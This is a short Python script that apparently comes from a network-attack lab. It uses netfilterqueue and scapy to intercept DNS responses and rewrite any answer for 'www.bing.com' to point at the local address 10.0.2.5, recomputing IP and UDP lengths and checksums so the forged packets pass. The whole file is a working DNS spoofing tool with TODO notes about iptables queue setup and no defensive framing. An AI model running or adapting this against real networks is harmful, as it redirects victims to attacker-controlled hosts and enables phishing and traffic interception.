#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
# Todo menu for mt pc or other pc forwarding
# TODO run bash to create a iptables queue and use bind to bind them
#TODO flush q after closing

ip="10.0.2.5"

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):

        qname=scapy_packet[scapy.DNSQR].qname
        # print(qname)
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer=scapy.DNSRR(rrname=qname, rdata= ip)
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount = 1

            ######################################################################
            #         delete len and checksum
            #         scapy automatically recalculate length and checksum
            ########################################################################
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum


            packet.set_payload(bytes(scapy_packet))


    packet.accept()


queue=netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)
queue.run()

